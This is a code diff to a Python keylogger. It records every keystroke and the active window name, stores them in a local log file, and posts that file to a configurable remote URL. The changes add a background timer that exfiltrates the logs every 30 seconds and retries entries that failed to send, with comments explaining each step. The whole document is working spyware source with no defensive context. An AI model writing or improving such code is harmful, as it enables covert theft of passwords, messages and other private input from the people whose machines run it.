@@ -1,9 +1,11 @@
-import keyboard
-import pyautogui
-import requests
-from datetime import datetime, timezone
+import keyboard # to get the keys used
+import pyautogui # to get window name
+import requests # to send logs
+import threading # to make log sending repeat in background
+from datetime import datetime, timezone # to classify logs by time sent
 
 URL = 'https://0.0.0.0' # the URL/IP to which you want to send the logs to
+INTERVAL = 30.0 # Interval between sending logs (in seconds)
 
 def send_log(): # send log
     try:
@@ -15,7 +17,7 @@ def send_log(): # send log
             file_payload = {'file':(file_name, log)} # make the payload for the file containing the file name and the file in binary
             r = requests.post(URL, files=file_payload) # POST (send) the file
             if not r.ok:
-                return
+                pass # Leaves the entries to go through later if the request didn't go through
             else: # assume new entries were made during process of sending and delete only entries which were already sent
                 with open('log','r+') as l:
                     lines = l.readlines() # get all the entries into an array
@@ -26,6 +28,13 @@ def send_log(): # send log
                             l.write(line) # rewrite the file, writing only lines of entries which weren't already sent
     except requests.exceptions.RequestException:
         pass
+    threading.Timer(INTERVAL, send_log).start() # start sending logs after the amount of seconds specified in INTERVAL
+
+threading.Timer(INTERVAL, send_log).start() # start sending logs after the amount of seconds specified in INTERVAL
+
+# NOTE about threading.Timer(): Each instance of threading.Timer() schedules the function to be played in n seconds in the background.
+# Therefore, the first instance of threading.Timer() makes it run the first time, and by adding threading.Timer() into the function itself,
+# it recursively repeats forever because each time the function runs it schedules itself to be ran again.
 
 while True:
     key = keyboard.read_event() # get name of key pressed
